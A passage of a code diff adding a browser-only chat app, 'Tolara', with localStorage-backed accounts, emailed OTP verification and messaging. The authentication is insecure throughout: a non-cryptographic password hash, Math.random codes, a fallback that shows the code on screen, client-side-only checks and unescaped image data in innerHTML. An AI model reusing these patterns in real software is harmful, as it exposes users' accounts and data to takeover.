+      onkeydown="if(event.key==='Enter')saveUsername()">
+    <div class="un-status" id="usernameStatus"></div>
+    <button class="btn-yellow" id="saveUsernameBtn" onclick="saveUsername()" disabled>Claim Username →</button>
+  </div>
+</div>
+
+<!-- ══ MAIN APP ══ -->
+<div id="mainApp">
+  <div class="layout">
+    <div class="sidebar">
+      <div class="sidebar-top">
+        <div class="logo-row">
+          <div class="logo-left">
+            <div class="logo-ghost">👻</div>
+            <span class="logo-text">Tolara</span>
+          </div>
+          <div style="display:flex;gap:6px;align-items:center;position:relative">
+            <div id="myMenuBtn" class="user-menu-btn" onclick="toggleMenu()"></div>
+            <div id="userDropdown" class="dropdown" style="display:none">
+              <div class="dropdown-item" id="myUsernameLabel" style="color:var(--yellow)"></div>
+              <div class="dropdown-item danger" onclick="doSignOut()">🚪 Sign out</div>
+            </div>
+          </div>
+        </div>
+        <div class="search-wrap">
+          <span class="search-icon">🔍</span>
+          <input class="search-input" id="sidebarSearch" placeholder="Search chats..." oninput="onSidebarSearch(this.value)">
+        </div>
+      </div>
+      <div class="tabs">
+        <div class="tab active" id="tabChats" onclick="showTab('chats')">💬 Chats</div>
+        <div class="tab" id="tabSearchPeople" onclick="showTab('search')">🔎 Find People</div>
+      </div>
+      <div class="list-wrap" id="listWrap"></div>
+    </div>
+    <div class="chat" id="chatPane">
+      <div class="empty-chat">
+        <div class="empty-ghost">👻</div>
+        <div style="font-size:15px;font-weight:800">Select a chat to start snapping</div>
+        <div style="font-size:12px;color:var(--muted);margin-top:4px">Use 🔎 Find People to search by username</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<div class="img-viewer" id="imgViewer" style="display:none" onclick="this.style.display='none'">
+  <img id="imgViewerImg" src="" alt="">
+</div>
+<input type="file" id="fileInput" accept="image/*" onchange="handleImageFile(event)">
+
+<script>
+// ════════════════════════════════════════════════
+//  LOCAL DATABASE (localStorage)
+// ════════════════════════════════════════════════
+const DB = {
+  getUsers()         { return JSON.parse(localStorage.getItem('tolara_users') || '{}'); },
+  setUsers(u)        { localStorage.setItem('tolara_users', JSON.stringify(u)); },
+  getUser(uid)       { return this.getUsers()[uid] || null; },
+  saveUser(uid, d)   { const u=this.getUsers(); u[uid]={...(u[uid]||{}), ...d}; this.setUsers(u); },
+
+  getUsernames()          { return JSON.parse(localStorage.getItem('tolara_usernames') || '{}'); },
+  usernameToUid(name)     { return (this.getUsernames()[name.toLowerCase()] || null); },
+  claimUsername(name,uid) { const u=this.getUsernames(); u[name.toLowerCase()]=uid; localStorage.setItem('tolara_usernames', JSON.stringify(u)); },
+  isUsernameTaken(name)   { return !!this.usernameToUid(name); },
+
+  getConversations()        { return JSON.parse(localStorage.getItem('tolara_convs') || '{}'); },
+  getConv(cid)              { return this.getConversations()[cid] || null; },
+  saveConv(cid, data)       { const c=this.getConversations(); c[cid]={...(c[cid]||{}), ...data}; localStorage.setItem('tolara_convs', JSON.stringify(c)); },
+  addMessage(cid, parts, m) {
+    const c = this.getConversations();
+    if (!c[cid]) c[cid] = {participants: parts, messages:[], lastMessage:'', lastTime:null, lastSenderId:''};
+    c[cid].messages.push(m);
+    c[cid].lastMessage = m.text || '📸 Image';
+    c[cid].lastTime = Date.now();
+    c[cid].lastSenderId = m.senderId;
+    localStorage.setItem('tolara_convs', JSON.stringify(c));
+  },
+
+  getSession()     { return localStorage.getItem('tolara_session'); },
+  setSession(uid)  { localStorage.setItem('tolara_session', uid); },
+  clearSession()   { localStorage.removeItem('tolara_session'); },
+
+  getCodes()           { return JSON.parse(localStorage.getItem('tolara_codes') || '{}'); },
+  storeCode(email, code, userData) {
+    const codes = this.getCodes();
+    codes[email.toLowerCase()] = { code, expires: Date.now() + 600000, userData };
+    localStorage.setItem('tolara_codes', JSON.stringify(codes));
+  },
+  verifyCode(email, code) {
+    const codes = this.getCodes();
+    const e = codes[email.toLowerCase()];
+    if (!e) return { ok: false, error: 'No code found. Try resending.' };
+    if (Date.now() > e.expires) return { ok: false, error: 'Code expired. Please resend.' };
+    if (e.code !== code.trim()) return { ok: false, error: 'Incorrect code. Try again.' };
+    delete codes[email.toLowerCase()];
+    localStorage.setItem('tolara_codes', JSON.stringify(codes));
+    return { ok: true, userData: e.userData };
+  }
+};
+
+// ════════════════════════════════════════════════
+//  HELPERS
+// ════════════════════════════════════════════════
+function genUID()  { return 'u_' + Math.random().toString(36).slice(2) + Date.now().toString(36); }
+function genCode() { return Math.floor(100000 + Math.random() * 900000).toString(); }
+function hashPw(p) {
+  let h = 5381;
+  for (let i = 0; i < p.length; i++) h = ((h<<5)+h) + p.charCodeAt(i);
+  return 'h_' + Math.abs(h).toString(36);
+}
+function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
+const COLORS = ['#FF6B6B','#3478F6','#BF5AF2','#FF9F0A','#4CD964','#FF375F','#00C7BE','#5AC8FA'];
+const colorFor = s => { let h=0; for(let i=0;i<s.length;i++) h=s.charCodeAt(i)+((h<<5)-h); return COLORS[Math.abs(h)%COLORS.length]; };
+const initFor  = n => (n||'??').slice(0,2).toUpperCase();
+const timeStr  = ts => { const d=new Date(ts||Date.now()); return d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}); };
+const convIdFor = (a,b) => [a,b].sort().join('_');
+const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2800);
+}
+
+// ════════════════════════════════════════════════
+//  APP STATE
+// ════════════════════════════════════════════════
+let currentUser   = null;
+let myProfile     = null;
+let friends       = {};
+let conversations = {};
+let activeUid     = null;
+let currentTab    = 'chats';
+let menuOpen      = false;
+let usernameValid = false;
+let unCheckTimer  = null;
+let pendingVerify = null; // { type:'signup'|'login', email, userData }
+let currentCode   = null;
+let pollInterval  = null;
+let presenceInterval = null;
+
+// BroadcastChannel for cross-tab real-time
+const bc = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel('tolara_realtime') : null;
+if (bc) {
+  bc.onmessage = e => {
+    if (!currentUser) return;
+    if (e.data.type === 'message' && e.data.cid) {
+      if (activeUid && convIdFor(currentUser.uid, activeUid) === e.data.cid) {
+        renderMessages(activeUid);
+        scrollBottom();
+      }
+      updateSidebarList();
+    }
+    if (e.data.type === 'presence') updateSidebarList();
+  };
+}
+
+// ════════════════════════════════════════════════
+//  INIT
+// ════════════════════════════════════════════════
+window.addEventListener('load', () => {
+  const uid = DB.getSession();
+  if (uid) {
+    const user = DB.getUser(uid);
+    if (user && user.username) {
+      currentUser = { uid };
+      myProfile = user;
+      DB.saveUser(uid, { online: true, lastSeen: Date.now() });
+      bc?.postMessage({ type: 'presence' });
+      launchApp();
+    } else if (user) {
+      currentUser = { uid };
+      myProfile = user;
+      showScreen('username');
+    } else {
+      showScreen('auth');
+    }
+  } else {
+    showScreen('auth');
+  }
+});
+
+window.addEventListener('beforeunload', () => {
+  if (currentUser) DB.saveUser(currentUser.uid, { online: false });
+  bc?.postMessage({ type: 'presence' });
+  bc?.close();
+});
+
+// ════════════════════════════════════════════════
+//  AUTH TAB SWITCH
+// ════════════════════════════════════════════════
+function switchAuthTab(tab) {
+  document.getElementById('tabLogin').classList.toggle('active', tab==='login');
+  document.getElementById('tabSignup').classList.toggle('active', tab==='signup');
+  document.getElementById('loginMode').style.display  = tab==='login'  ? 'block' : 'none';
+  document.getElementById('signupMode').style.display = tab==='signup' ? 'block' : 'none';
+  document.getElementById('loginErr').textContent = '';
+}
+
+// ════════════════════════════════════════════════
+//  LOGIN
+// ════════════════════════════════════════════════
+function doLogin() {
+  const ident = document.getElementById('loginIdent').value.trim();
+  const pass  = document.getElementById('loginPass').value;
+  const err   = document.getElementById('loginErr');
+  const btn   = document.getElementById('loginBtn');
+  err.textContent = '';
+
+  if (!ident) { err.textContent = 'Enter your email or username'; return; }
+  if (!pass)  { err.textContent = 'Enter your password'; return; }
+
+  btn.disabled = true;
+  btn.textContent = 'Signing in…';
+
+  const users = DB.getUsers();
+  let user = null;
+
+  if (ident.includes('@')) {
+    user = Object.values(users).find(u => u.email === ident.toLowerCase());
+  } else {
+    const uid = DB.usernameToUid(ident);
+    user = uid ? users[uid] : null;
+  }
+
+  if (!user) {
+    err.textContent = 'Account not found. Check your email or username.';
+    btn.disabled = false; btn.textContent = 'Log In →'; return;
+  }
+  if (user.passwordHash !== hashPw(pass)) {
+    err.textContent = 'Incorrect password.';
+    btn.disabled = false; btn.textContent = 'Log In →'; return;
+  }
+
+  // Send login verification code
+  const loginCode = genCode();
+  DB.storeCode(user.email, loginCode, { type: 'login', uid: user.uid });
+  pendingVerify = { type: 'login', email: user.email, uid: user.uid, name: user.name || user.displayName || '' };
+
+  document.getElementById('verifyEmailLabel').textContent = user.email;
+  document.getElementById('emailStatus').textContent = '';
+  document.getElementById('demoBox').style.display = 'none';
+  clearOtpBoxes();
+
+  btn.disabled = false; btn.textContent = 'Log In →';
+  showScreen('verify');
+  sendVerificationEmail(user.email, loginCode, user.name || user.displayName || '');
+}
+
+// ════════════════════════════════════════════════
+//  SIGNUP STEPS
+// ════════════════════════════════════════════════
+let signupData = {};
+let signupStep = 1;
+
+function switchSignupStep(step) {
+  document.querySelectorAll('.signup-step').forEach((el,i) => {
+    el.classList.toggle('active', i+1 === step);
+  });
+  for (let i = 0; i < 4; i++) {
+    document.getElementById('dot'+i).classList.toggle('done', i < step);
+  }
+  signupStep = step;
+}
+
+function signupNext(from) {
+  document.getElementById('step'+from+'Err').textContent = '';
+
+  if (from === 1) {
+    const first = document.getElementById('signupFirst').value.trim();
+    const last  = document.getElementById('signupLast').value.trim();
+    if (!first || !last) { document.getElementById('step1Err').textContent = 'Please enter your full name.'; return; }
+    signupData.name = first + ' ' + last;
+    switchSignupStep(2);
+    setTimeout(() => document.getElementById('signupEmail').focus(), 50);
+
+  } else if (from === 2) {
+    const email = document.getElementById('signupEmail').value.trim().toLowerCase();
+    if (!isValidEmail(email)) { document.getElementById('step2Err').textContent = 'Enter a valid email address.'; return; }
+    if (Object.values(DB.getUsers()).find(u => u.email === email)) {
+      document.getElementById('step2Err').textContent = 'An account with this email already exists.'; return;
+    }
+    signupData.email = email;
+    switchSignupStep(3);
+    setTimeout(() => document.getElementById('signupPass').focus(), 50);
+
+  } else if (from === 3) {
+    const pw1 = document.getElementById('signupPass').value;
+    const pw2 = document.getElementById('signupPass2').value;
+    if (pw1.length < 8) { document.getElementById('step3Err').textContent = 'Password must be at least 8 characters.'; return; }
+    if (pw1 !== pw2) { document.getElementById('step3Err').textContent = "Passwords don't match."; return; }
+    signupData.password = pw1;
+    switchSignupStep(4);
+    setTimeout(() => document.getElementById('signupUsername').focus(), 50);
+
+  } else if (from === 4) {
+    if (!usernameValid) { document.getElementById('step4Err').textContent = 'Choose a valid, available username.'; return; }
+    signupData.username = document.getElementById('signupUsername').value.trim().toLowerCase();
+
+    // Send verification code
+    const signupCode = genCode();
+    DB.storeCode(signupData.email, signupCode, { type: 'signup', ...signupData });
+    pendingVerify = { type: 'signup', email: signupData.email, name: signupData.name || '' };
+
+    document.getElementById('verifyEmailLabel').textContent = signupData.email;
+    document.getElementById('emailStatus').textContent = '';
+    document.getElementById('demoBox').style.display = 'none';
+    clearOtpBoxes();
+    showScreen('verify');
+    sendVerificationEmail(signupData.email, signupCode, signupData.name || '');
+  }
+}
+
+function signupBack(from) {
+  if (from === 2) switchSignupStep(1);
+  else if (from === 3) switchSignupStep(2);
+  else if (from === 4) switchSignupStep(3);
+}
+
+// Password strength
+function checkPwStrength(pw) {
+  const bars = ['pb1','pb2','pb3'];
+  let strength = 0;
+  if (pw.length >= 8) strength++;
+  if (/[A-Z]/.test(pw) || /[0-9]/.test(pw)) strength++;
+  if (/[^a-zA-Z0-9]/.test(pw) || pw.length >= 12) strength++;
+  bars.forEach((id, i) => {
+    const b = document.getElementById(id);
+    b.className = 'pw-bar';
+    if (i < strength) b.classList.add(strength===1?'weak':strength===2?'medium':'strong');
+  });
+}
+
+// Username check (for signup step 4)
+function onUsernameType(val) {
+  const clean = val.toLowerCase().replace(/[^a-z0-9_.]/g,'');
+  document.getElementById('signupUsername').value = clean;
+  clearTimeout(unCheckTimer);
+  usernameValid = false;
+  document.getElementById('usernameNextBtn').disabled = true;
+  const hint = document.getElementById('usernameHint');
+  if (!clean) { hint.textContent=''; hint.className='field-hint'; return; }
+  if (clean.length < 3) { hint.textContent='Too short (min 3)'; hint.className='field-hint err'; return; }
+  hint.innerHTML='<span class="spinner"></span> Checking…';
+  hint.className='field-hint checking';
+  unCheckTimer = setTimeout(() => {
+    if (DB.isUsernameTaken(clean)) {
+      hint.textContent='❌ @'+clean+' is taken';
+      hint.className='field-hint err';
+    } else {
+      hint.textContent='✅ @'+clean+' is available!';
+      hint.className='field-hint ok';
+      usernameValid = true;
+      document.getElementById('usernameNextBtn').disabled = false;
+    }
+  }, 400);
+}
+
+// ════════════════════════════════════════════════
+//  EMAILJS CONFIG — fill these in with your details
+//  Sign up free at https://www.emailjs.com
+// ════════════════════════════════════════════════
+const EMAILJS_PUBLIC_KEY  = 'ze1GuMmO3H2tsT8j3';
+const EMAILJS_SERVICE_ID  = 'service_iaweosd';
+const EMAILJS_TEMPLATE_ID = 'template_jo9i3cf';
+
+// Initialise EmailJS (safe to call even before DOM ready)
+if (typeof emailjs !== 'undefined') {
+  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+}
+
+async function sendVerificationEmail(toEmail, code, userName) {
+  const statusEl = document.getElementById('emailStatus');
+  const demoBox  = document.getElementById('demoBox');
+  statusEl.textContent = '📨 Sending verification email…';
+
+  // Store code always (needed for verify step)
+  currentCode = code;
+
+  // If EmailJS is missing or keys are not configured, fall back to demo box immediately
+  if (typeof emailjs === 'undefined' || EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY') {
+    statusEl.textContent = '⚠️ Email sending is not available — using fallback code below.';
+    document.getElementById('demoCode').textContent = code;
+    demoBox.style.display = 'block';
+    return;
+  }
+
+  try {
+    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+      to_email:   toEmail,
+      to_name:    userName || toEmail,
+      otp_code:   code,
+      app_name:   'Tolara',
+    });
+    statusEl.innerHTML = '✅ Code sent to <strong style="color:var(--yellow)">' + toEmail + '</strong>';
+    demoBox.style.display = 'none';
+  } catch (err) {
+    console.error('EmailJS error:', err);
+    statusEl.textContent = '⚠️ Could not send email — use the code below.';
+    document.getElementById('demoCode').textContent = code;
+    demoBox.style.display = 'block';
+  }
+}
+
+// ════════════════════════════════════════════════
+//  OTP / VERIFICATION
+// ════════════════════════════════════════════════
+function getOtpBoxes() { return Array.from(document.querySelectorAll('.otp-box')); }
+
+function clearOtpBoxes() {
+  getOtpBoxes().forEach(b => { b.value=''; b.classList.remove('filled'); });
+  document.getElementById('otpErr').textContent = '';
+  document.getElementById('verifyBtn').disabled = true;
+}
+
+function otpInput(el, idx) {
+  const boxes = getOtpBoxes();
+  el.value = el.value.replace(/[^0-9]/g,'').slice(0,1);
+  el.classList.toggle('filled', !!el.value);
+  if (el.value && idx < 5) boxes[idx+1].focus();
+  // Enable/disable verify button based on whether all boxes filled
+  const allFilled = boxes.every(b => b.value);
+  document.getElementById('verifyBtn').disabled = !allFilled;
+}
+
+function otpKeydown(e, idx) {
+  const boxes = getOtpBoxes();
+  if (e.key === 'Backspace' && !boxes[idx].value && idx > 0) {
+    boxes[idx-1].focus();
+    // Re-check button state
+    document.getElementById('verifyBtn').disabled = true;
+  }
+  if (e.key.toLowerCase() === 'v' && (e.ctrlKey || e.metaKey)) {
+    e.preventDefault();
+    navigator.clipboard.readText().then(text => {
+      const digits = text.replace(/\D/g,'').slice(0,6);
+      if (digits.length === 6) {
+        digits.split('').forEach((d,i) => { boxes[i].value=d; boxes[i].classList.add('filled'); });
+        document.getElementById('verifyBtn').disabled = false;
+      }
+    }).catch(()=>{});
+  }
+}
+
+function autofillCode() {
+  const code = document.getElementById('demoCode').textContent;
+  if (!code || code === '------') return;
+  const boxes = getOtpBoxes();
+  code.split('').forEach((d,i) => { boxes[i].value=d; boxes[i].classList.add('filled'); });
+  document.getElementById('verifyBtn').disabled = false;
+}
+
+function submitOtp() {
+  const boxes = getOtpBoxes();
+  const code = boxes.map(b=>b.value).join('');
+  if (code.length !== 6) return;
+
+  const errEl = document.getElementById('otpErr');
+  errEl.textContent = '';
+
+  // Check against the stored code directly
+  if (code !== currentCode) {
+    errEl.textContent = 'Incorrect code. Try again.';
+    // Shake the boxes
+    boxes.forEach(b => { b.classList.add('invalid'); setTimeout(() => b.classList.remove('invalid'), 600); });
+    return;
+  }
+
+  // Also verify via DB (checks expiry)
+  const result = DB.verifyCode(pendingVerify.email, code);
+  if (!result.ok) { errEl.textContent = result.error; return; }
+
+  const userData = result.userData;
+
+  if (userData.type === 'signup') {
+    const uid = genUID();
+    DB.saveUser(uid, {
+      uid,
+      name: userData.name,
+      displayName: userData.name,
+      email: userData.email,
+      passwordHash: hashPw(userData.password),
+      username: userData.username,
+      friends: [],
+      online: true,
+      lastSeen: Date.now(),
+      createdAt: Date.now()
+    });
+    DB.claimUsername(userData.username, uid);
+    DB.setSession(uid);
+    currentUser = { uid };
+    myProfile = DB.getUser(uid);
+    pendingVerify = null;
+    currentCode = null;
+    launchApp();
+
+  } else if (userData.type === 'login') {
+    DB.saveUser(userData.uid, { online: true, lastSeen: Date.now() });
+    DB.setSession(userData.uid);
+    currentUser = { uid: userData.uid };
+    myProfile = DB.getUser(userData.uid);
+    pendingVerify = null;
+    currentCode = null;
+    if (myProfile.username) {
+      launchApp();
+    } else {
+      showScreen('username');
+    }
+  }
+}
+
+function resendCode() {
+  if (!pendingVerify) return;
+  const newCode = genCode();
+  const emailKey = pendingVerify.email.toLowerCase();
+  const existingUserData = DB.getCodes()[emailKey]?.userData;
+  DB.storeCode(pendingVerify.email, newCode, existingUserData || pendingVerify);
+  clearOtpBoxes();
+  document.getElementById('demoBox').style.display = 'none';
+  sendVerificationEmail(pendingVerify.email, newCode, pendingVerify.name || '');
+  showToast('New code sent!');
+}
+
+function goBackFromVerify() {
+  const type = pendingVerify?.type;
+  pendingVerify = null;
+  currentCode = null;
+  showScreen('auth');
+  switchAuthTab(type === 'signup' ? 'signup' : 'login');
+}
+
+// ════════════════════════════════════════════════
+//  USERNAME SCREEN (post-Google-style login)
+// ════════════════════════════════════════════════
+let unInputTimer = null;
+let unInputValid = false;
+
+function onUsernameInputType(val) {
+  const clean = val.toLowerCase().replace(/[^a-z0-9_.]/g,'');
+  document.getElementById('usernameInput').value = clean;
+  clearTimeout(unInputTimer);
+  unInputValid = false;
+  document.getElementById('saveUsernameBtn').disabled = true;
+  const status = document.getElementById('usernameStatus');
+  if (!clean) { status.textContent=''; status.className='un-status'; return; }
+  if (clean.length < 3) { status.textContent='Too short (min 3 chars)'; status.className='un-status err'; return; }
+  status.innerHTML='<span class="spinner"></span> Checking…'; status.className='un-status checking';
+  unInputTimer = setTimeout(() => {
+    if (DB.isUsernameTaken(clean)) {
+      status.textContent='❌ @'+clean+' is taken'; status.className='un-status err';
+      document.getElementById('usernameInput').className='setup-input invalid';
+    } else {
+      status.textContent='✅ @'+clean+' is available!'; status.className='un-status ok';
+      document.getElementById('usernameInput').className='setup-input valid';
+      unInputValid = true;
+      document.getElementById('saveUsernameBtn').disabled = false;
+    }
+  }, 400);
+}
+
+function saveUsername() {
+  if (!unInputValid || !currentUser) return;
+  const username = document.getElementById('usernameInput').value.trim().toLowerCase();
+  const btn = document.getElementById('saveUsernameBtn');
+  btn.disabled = true; btn.textContent = 'Saving…';
+  if (DB.isUsernameTaken(username)) {
+    showToast('Username just got taken! Try another.');
+    btn.disabled = false; btn.textContent = 'Claim Username →'; return;
+  }
+  DB.claimUsername(username, currentUser.uid);
+  DB.saveUser(currentUser.uid, { username, online: true, lastSeen: Date.now() });
+  myProfile = DB.getUser(currentUser.uid);
+  launchApp();
+}
+
+// ════════════════════════════════════════════════
+//  SIGN OUT
+// ════════════════════════════════════════════════
+function doSignOut() {
+  toggleMenu();
+  if (currentUser) DB.saveUser(currentUser.uid, { online: false });
+  bc?.postMessage({ type: 'presence' });
+  DB.clearSession();
+  currentUser = null; myProfile = null; friends = {}; conversations = {}; activeUid = null;
+  clearInterval(pollInterval);
+  clearInterval(presenceInterval);
+  signupData = {}; signupStep = 1;
+  switchSignupStep(1);
+  switchAuthTab('login');
+  document.getElementById('loginIdent').value = '';
+  document.getElementById('loginPass').value = '';
+  showScreen('auth');
+}
+
+function toggleMenu() {
+  menuOpen = !menuOpen;
+  document.getElementById('userDropdown').style.display = menuOpen ? 'block' : 'none';
+}
+document.addEventListener('click', e => {
+  const btn = document.getElementById('myMenuBtn');
+  const drop = document.getElementById('userDropdown');
+  if (menuOpen && btn && !btn.contains(e.target) && drop && !drop.contains(e.target)) {
+    menuOpen = false;
+    drop.style.display = 'none';
+  }
+});
+
+// ════════════════════════════════════════════════
+//  LAUNCH APP
+// ════════════════════════════════════════════════
+function launchApp() {
+  // Update menu button
+  const btn = document.getElementById('myMenuBtn');
+  const c = colorFor(currentUser.uid);
+  btn.style.background = c + '33';
+  btn.style.color = c;
+  btn.textContent = initFor(myProfile.displayName || myProfile.name);
+
+  document.getElementById('myUsernameLabel').textContent = '@' + myProfile.username;
+  document.getElementById('sidebarSearch').value = '';
+
+  loadConversations();
+  showScreen('main');
+  updateSidebarList();
+
+  // Poll for updates every 2 seconds (for cross-tab when BroadcastChannel not used)
+  clearInterval(pollInterval);
+  pollInterval = setInterval(() => {
+    if (activeUid) renderMessages(activeUid);
+    updateSidebarList();
+  }, 2000);
+
+  // Mark online periodically
+  clearInterval(presenceInterval);
+  presenceInterval = setInterval(() => {
+    if (currentUser) DB.saveUser(currentUser.uid, { online: true, lastSeen: Date.now() });
+  }, 30000);
+}
+
+// ════════════════════════════════════════════════
+//  CONVERSATIONS
+// ════════════════════════════════════════════════
+function loadConversations() {
+  if (!currentUser) return;
+  const convs = DB.getConversations();
+  conversations = {};
+  Object.entries(convs).forEach(([cid, conv]) => {
+    if (!Array.isArray(conv.participants) || !conv.participants.includes(currentUser.uid)) return;
+    const otherUid = conv.participants.find(uid => uid !== currentUser.uid);
+    if (!otherUid) return;
+    conversations[otherUid] = { convId: cid, ...conv };
+    // Load friend profile
+    if (!friends[otherUid]) {
+      const f = DB.getUser(otherUid);
+      if (f) friends[otherUid] = f;
+    }
+  });
+}
+
+function updateSidebarList() {
+  if (!currentUser || currentTab !== 'chats') return;
+  loadConversations(); // reload fresh
+
+  const wrap = document.getElementById('listWrap');
+  const query = document.getElementById('sidebarSearch').value.trim().toLowerCase();
+
+  const entries = Object.entries(conversations)
+    .filter(([uid]) => {
+      if (!query) return true;
+      const f = friends[uid];
+      return (f?.username||'').toLowerCase().includes(query) || (f?.name||f?.displayName||'').toLowerCase().includes(query);
+    })
+    .sort(([,a],[,b]) => (b.lastTime||0) - (a.lastTime||0));
+
+  if (!entries.length) {
+    wrap.innerHTML = '<div class="empty-list">No conversations yet.<br>Use 🔎 Find People to start one!</div>';
+    return;
+  }
+
+  wrap.innerHTML = '';
+  entries.forEach(([uid, conv]) => {
+    const f = friends[uid];
+    if (!f) return;
+    const c = colorFor(uid);
+    const isOnline = f.online && (Date.now() - (f.lastSeen||0)) < 60000;
+    const isMine = conv.lastSenderId === currentUser.uid;
+    const lastMsg = conv.lastMessage ? (isMine?'You: ':'')+conv.lastMessage : 'Say hello!';
+    const lastTime = conv.lastTime ? timeStr(conv.lastTime) : '';
+
+    const div = document.createElement('div');
+    div.className = 'convo-item' + (activeUid===uid?' active':'');
+    div.onclick = () => openChat(uid);
+    div.innerHTML = `
+      <div class="av" style="background:${c}22;color:${c}">
+        ${initFor(f.name||f.displayName)}
+        ${isOnline?'<div class="online-dot"></div>':''}
+      </div>
+      <div class="ci">
+        <div class="cn">${esc(f.name||f.username)}</div>
+        <div class="cp">${esc(lastMsg)}</div>
+      </div>
+      <div class="cr"><div class="ct">${lastTime}</div></div>`;
+    wrap.appendChild(div);
+  });
+}
+
+// ════════════════════════════════════════════════
+//  OPEN CHAT
+// ════════════════════════════════════════════════
+function openChat(uid) {
+  activeUid = uid;
+  const f = friends[uid];
+  if (!f) return;
+  const c = colorFor(uid);
+  const isOnline = f.online && (Date.now() - (f.lastSeen||0)) < 60000;
+
+  updateSidebarList();
+
+  const pane = document.getElementById('chatPane');
+  pane.innerHTML = `
+    <div class="chat-hdr">
+      <div class="hav" style="background:${c}22;color:${c}">${initFor(f.name||f.displayName)}</div>
+      <div class="hi">
+        <div class="hn">${esc(f.name||f.username)}</div>
+        <div class="hs">@${esc(f.username)} · ${isOnline?'<span style="color:var(--green)">Online</span>':'Last seen '+timeStr(f.lastSeen)}</div>
+      </div>
+    </div>
+    <div class="msgs" id="msgs"></div>
+    <div class="input-bar">
+      <button class="attach-btn" onclick="document.getElementById('fileInput').click()" title="Send image">📎</button>
+      <input class="chat-input" id="chatInput" placeholder="Send a snap…"
+        onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMsg();}">
+      <button class="send-btn" onclick="sendMsg()">➤</button>
+    </div>`;
+
+  renderMessages(uid);
+  scrollBottom();
+}
+
+function renderMessages(uid) {
+  if (activeUid !== uid) return;
+  const cid = convIdFor(currentUser.uid, uid);
+  const conv = DB.getConv(cid);
+  const msgs = conv?.messages || [];
+  const list = document.getElementById('msgs');
+  if (!list) return;
+
+  const scrolledToBottom = list.scrollHeight - list.scrollTop - list.clientHeight < 60;
+
+  list.innerHTML = '';
+  msgs.forEach(msg => appendMsgEl(uid, msg, list));
+
+  if (scrolledToBottom) scrollBottom();
+}
+
+function appendMsgEl(uid, msg, list) {
+  const mine = msg.senderId === currentUser.uid;
+  const f = mine ? myProfile : (friends[uid] || {});
+  const c = colorFor(msg.senderId);
+
+  const div = document.createElement('div');
+  div.className = 'msg-row' + (mine?' mine':'');
+
+  const content = msg.image
+    ? `<div class="img-bub" onclick="viewImg('${msg.image}')"><img src="${msg.image}" alt="img" loading="lazy"></div>`
+    : `<div class="bubble ${mine?'mine':'theirs'}">${esc(msg.text)}</div>`;
+
+  div.innerHTML = `
+    ${!mine?`<div class="msav" style="background:${c}22;color:${c}">${initFor(f.name||f.displayName||'?')}</div>`:''}
+    ${content}
+    <div class="mtime">${timeStr(msg.timestamp)}</div>`;
+  list.appendChild(div);
+}
+
+function sendMsg(imageData) {
+  const input = document.getElementById('chatInput');
+  const text = imageData ? '' : (input?.value.trim() || '');
+  if (!text && !imageData) return;
+  if (!activeUid) return;
+  if (input) input.value = '';
+
+  const cid = convIdFor(currentUser.uid, activeUid);
+  const msg = {
+    id: genUID(),
+    senderId: currentUser.uid,
+    text,
+    image: imageData || '',
+    timestamp: Date.now()
+  };
+
+  DB.addMessage(cid, [currentUser.uid, activeUid], msg);
+  renderMessages(activeUid);
+  scrollBottom();
+  updateSidebarList();
+  bc?.postMessage({ type: 'message', cid });
+}
+
+// ════════════════════════════════════════════════
+//  SEARCH PEOPLE
+// ════════════════════════════════════════════════
+function showTab(tab) {
+  currentTab = tab;
+  document.getElementById('tabChats').classList.toggle('active', tab==='chats');
+  document.getElementById('tabSearchPeople').classList.toggle('active', tab==='search');
+  document.getElementById('sidebarSearch').placeholder = tab==='chats' ? 'Search chats...' : 'Search by @username…';
+  document.getElementById('sidebarSearch').value = '';
+
+  if (tab === 'chats') { updateSidebarList(); }
+  else { renderSearchTab(''); }
+}
+
+function onSidebarSearch(val) {
+  if (currentTab === 'chats') updateSidebarList();
+  else renderSearchTab(val.trim().toLowerCase());
+}
+
+function renderSearchTab(query) {
+  const wrap = document.getElementById('listWrap');
+  if (!query) {
+    wrap.innerHTML = '<div class="empty-list">Type a username to find people.</div>';
+    return;
+  }
+  const usernames = DB.getUsernames();
+  const users = DB.getUsers();
+  const results = Object.entries(usernames)
+    .filter(([name]) => name.includes(query) && usernames[name] !== currentUser.uid)
+    .map(([name, uid]) => users[uid])
+    .filter(Boolean);
+
+  wrap.innerHTML = '';
+  if (!results.length) {
+    wrap.innerHTML = '<div class="empty-list">No users found for "<strong>'+esc(query)+'</strong>"</div>';
+    return;
+  }
+  results.forEach(u => {
+    const c = colorFor(u.uid);
+    const div = document.createElement('div');
+    div.className = 'search-result-item';
+    div.innerHTML = `
+      <div class="av" style="background:${c}22;color:${c}">${initFor(u.name||u.displayName)}</div>
+      <div class="ci">
+        <div class="cn">${esc(u.name||u.username)}</div>
+        <div class="cp">@${esc(u.username)}</div>
+      </div>
+      <button style="background:var(--yellow);color:#000;border:none;border-radius:8px;padding:5px 12px;font-family:'Nunito',sans-serif;font-size:11px;font-weight:800;cursor:pointer"
+        onclick="startChat('${esc(u.uid)}')">Message</button>`;
+    wrap.appendChild(div);
+  });
+}
+
+function startChat(uid) {
+  // Load friend if not cached
+  if (!friends[uid]) friends[uid] = DB.getUser(uid);
+  showTab('chats');
+  openChat(uid);
+}
+
+// ════════════════════════════════════════════════
+//  IMAGES
+// ════════════════════════════════════════════════
+function handleImageFile(e) {
+  const file = e.target.files[0];
+  if (!file || !activeUid) return;
+  e.target.value = '';
+  const reader = new FileReader();
+  reader.onload = ev => compress(ev.target.result, 500, url => sendMsg(url));
+  reader.readAsDataURL(file);
+}
+function compress(src, maxW, cb) {
+  const img = new Image();
+  img.onload = () => {
+    const r = Math.min(maxW/img.width, maxW/img.height, 1);
+    const c = document.createElement('canvas');
+    c.width = Math.round(img.width*r); c.height = Math.round(img.height*r);
